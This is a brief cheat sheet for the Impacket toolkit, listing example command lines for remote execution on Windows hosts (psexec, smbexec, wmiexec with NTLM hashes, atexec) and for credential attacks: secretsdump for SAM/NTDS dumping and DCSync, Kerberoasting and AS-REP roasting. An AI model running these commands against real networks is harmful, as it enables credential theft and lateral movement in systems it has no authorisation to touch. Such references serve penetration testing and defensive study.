# Impacket Toolkit Reference

Impacket is a collection of Python classes for working with network protocols, especially SMB, MSRPC, and Kerberos.

---

### Command Execution Tools

| Tool | Protocol | Mechanism | Example Syntax |
| :--- | :--- | :--- | :--- |
| `psexec.py` | SMB | Creates a Windows service on the target host | `psexec.py domain/user:password@target_ip` |
| `smbexec.py` | SMB | Uses native service commands without uploading a binary | `smbexec.py domain/user:password@target_ip` |
| `wmiexec.py` | WMI / DCOM | Semi-interactive shell executed via WMI | `wmiexec.py -hashes :NTLM_HASH user@target_ip` |
| `atexec.py` | Task Scheduler | Executes a command once using Windows Task Scheduler | `atexec.py domain/user:password@target_ip "whoami"` |

---

### Credential Dumping & Active Directory

#### `secretsdump.py`
Dumps NTLM hashes, Kerberos keys, and plaintext secrets from SAM, LSA secrets, and NTDS.dit.

```bash
# Local SAM dump over SMB
secretsdump.py domain/user:password@target_ip

# DCSync attack against Domain Controller
secretsdump.py -just-dc-ntlm domain.local/admin_user@dc_ip
```

#### `GetUserSPNs.py` (Kerberoasting)
```bash
GetUserSPNs.py domain.local/user:password -dc-ip dc_ip -request
```

#### `GetNPUsers.py` (AS-REP Roasting)
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip dc_ip
```
